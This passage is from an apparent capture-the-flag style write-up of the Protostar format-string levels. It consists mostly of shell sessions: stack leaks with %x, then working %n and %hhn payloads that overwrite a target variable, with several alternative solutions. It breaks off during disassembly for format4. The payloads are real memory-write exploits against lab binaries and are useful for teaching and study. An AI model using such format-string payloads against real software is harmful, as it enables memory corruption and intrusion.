</span><span style="color:#d0dfe6;">aaaa%</span><span style="color:#6ee2ff;">0</span><span style="color:#d0dfe6;">$08x.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.
</span><span style="color:#d0dfe6;">$</span><span> ./format1 `</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\x38\x96\x04\x08%130</span><span style="color:#4cbbff;">\\\$</span><span style="color:#6ee2ff;">08n.&#39;</span><span style="color:#516a88;">&quot;</span><span>`
</span><span style="color:#d0dfe6;">8.you</span><span> have modified the target :)
</span></code></pre>
<h1 id="format-2">Format 2</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -t</span><span> format2 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> target
</span><span style="color:#d0dfe6;">080496e4</span><span> g     O .bss   00000004              target
</span><span style="color:#d0dfe6;">$</span><span> i=0</span><span style="color:#748aa6;">; while </span><span style="color:#267fb5;">[ </span><span>$</span><span style="color:#d0dfe6;">i </span><span style="font-style:italic;color:#95cc5e;">-le</span><span> 10 </span><span style="color:#267fb5;">]</span><span style="color:#748aa6;">; do </span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;aaaa%%%03d</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39; % $</span><span style="color:#d0dfe6;">i</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format2 </span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">i</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">$((i</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">1))</span><span style="color:#748aa6;">; done
</span><span style="color:#d0dfe6;">aaaa%</span><span style="color:#6ee2ff;">0</span><span style="color:#d0dfe6;">$08x.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaa00000200.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaab7fd8420.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaabffffb14.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaa61616161.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaa35303025.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaa78383024.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaa00000a2e.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaab7fff524.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaabffffb70.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">aaaab7fe35c9.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format2
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.
</span><span style="color:#d0dfe6;">target</span><span> is 0 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format2
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
</span><span style="color:#d0dfe6;">you</span><span> have modified the target :)
</span></code></pre>
<h1 id="format-3">Format 3</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -t</span><span> format3 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> target
</span><span style="color:#d0dfe6;">080496f4</span><span> g     O .bss   00000004              target
</span><span style="color:#d0dfe6;">$</span><span> i=0</span><span style="color:#748aa6;">; while </span><span style="color:#267fb5;">[ </span><span>$</span><span style="color:#d0dfe6;">i </span><span style="font-style:italic;color:#95cc5e;">-le</span><span> 20 </span><span style="color:#267fb5;">]</span><span style="color:#748aa6;">; do </span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;aaaa%%%03d</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39; % $</span><span style="color:#d0dfe6;">i</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3 </span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">i</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">$((i</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">1))</span><span style="color:#748aa6;">; done
</span><span style="color:#d0dfe6;">aaaa%</span><span style="color:#6ee2ff;">0</span><span style="color:#d0dfe6;">$08x.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000000.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaabffffad0.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaab7fd7ff4.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000000.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000000.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaabffffcd8.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa0804849d.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaabffffad0.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000200.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaab7fd8420.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaabffffb14.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa61616161.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa33313025.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa78383024.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000a2e.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaab7fff524.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaabffffb70.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaab7fe35c9.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000007.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">aaaa00000010.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%13</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">Segmentation</span><span> fault
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%13</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%14</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%14</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%14</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
</span><span style="color:#d0dfe6;">target</span><span> is 00000100 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%16</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08na%17</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.
</span><span style="color:#d0dfe6;">target</span><span> is 01000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%16</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08na%17</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">Segmentation</span><span> fault
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a%16</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08na%17</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.
</span><span style="color:#d0dfe6;">target</span><span> is 00020000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#39;+&#39;a&#39;*(0x44-12)+&#39;%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%13</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;+&#39;a&#39;*(0x102-0x55)+&#39;%14</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x.&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.
</span><span style="color:#d0dfe6;">target</span><span> is 00000000 :(
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#39;+&#39;a&#39;*(0x44-12)+&#39;%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%13</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x&#39;+&#39;a&#39;*(0x102-0x55)+&#39;%14</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6
</span></code></pre>
<h2 id="solution-0-brute">solution 0: Brute!</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xf4\x96\x04\x08&#39;+&#39;%016930112d&#39;+&#39;%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000...
</span><span style="color:#516a88;"># 反正这里有很多很多很多零，我就好心删了它们
</span><span style="color:#d0dfe6;">...0000000000000
</span><span style="color:#d0dfe6;">you</span><span> have modified the target :)
</span></code></pre>
<h2 id="solution-1-gentle">solution 1: Gentle</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#39;+&#39;a&#39;*(0x44-12)+&#39;%12</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%13</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n&#39;+&#39;a&#39;*(0x102-0x55)+&#39;%14</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08n&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span style="color:#d0dfe6;">you</span><span> have modified the target :)
</span></code></pre>
<h2 id="solution-2-more-gentle">solution 2: More gentle</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;+&#39;%16</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">hhn&#39;+&#39;a&#39;+&#39;%17</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">hhn&#39;+&#39;\xf7\x96\x04\x08&#39;+&#39;\xf6\x96\x04\x08&#39;+&#39;\xf5\x96\x04\x08&#39;+&#39;\xf4\x96\x04\x08&#39;+&#39;a&#39;*(0x44-2-16)+&#39;%19</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">hhn&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%18</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">hhn&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format3
</span><span style="color:#d0dfe6;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span style="color:#d0dfe6;">you</span><span> have modified the target :)
</span></code></pre>
<h1 id="format-4">Format 4</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> gdb</span><span style="font-style:italic;color:#95cc5e;"> -q</span><span> format4
</span><span style="color:#d0dfe6;">Reading</span><span> symbols from /opt/protostar/bin/format4...done.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) disas hello
</span><span style="color:#d0dfe6;">Dump</span><span> of assembler code for function hello:
</span><span style="color:#d0dfe6;">0x080484b4 </span><span style="color:#748aa6;">&lt;</span><span>hello+0</span><span style="color:#748aa6;">&gt;</span><span>:   push   %</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x080484b5 </span><span style="color:#748aa6;">&lt;</span><span>hello+1</span><span style="color:#748aa6;">&gt;</span><span>:   mov    %</span><span style="color:#d0dfe6;">esp</span><span>,%</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x080484b7 </span><span style="color:#748aa6;">&lt;</span><span>hello+3</span><span style="color:#748aa6;">&gt;</span><span>:   sub    $</span><span style="color:#d0dfe6;">0</span><span>x18,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x080484ba </span><span style="color:#748aa6;">&lt;</span><span>hello+6</span><span style="color:#748aa6;">&gt;</span><span>:   movl   $</span><span style="color:#d0dfe6;">0</span><span>x80485f0,(%</span><span style="color:#d0dfe6;">esp</span><span>)
</span><span style="color:#d0dfe6;">0x080484c1 </span><span style="color:#748aa6;">&lt;</span><span>hello+13</span><span style="color:#748aa6;">&gt;</span><span>:  call   0x80483dc </span><span style="color:#748aa6;">&lt;</span><span>puts@plt</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">0x080484c6 </span><span style="color:#748aa6;">&lt;</span><span>hello+18</span><span style="color:#748aa6;">&gt;</span><span>:  movl   $</span><span style="color:#d0dfe6;">0</span><span>x1,(%</span><span style="color:#d0dfe6;">esp</span><span>)
</span><span style="color:#d0dfe6;">0x080484cd </span><span style="color:#748aa6;">&lt;</span><span>hello+25</span><span style="color:#748aa6;">&gt;</span><span>:  call   0x80483bc </span><span style="color:#748aa6;">&lt;</span><span>_exit@plt</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">End</span><span> of assembler dump.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) quit
</span><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -TR</span><span> format4
</span><span>
</span><span style="color:#d0dfe6;">format4:</span><span>     file format elf32-i386
</span><span>
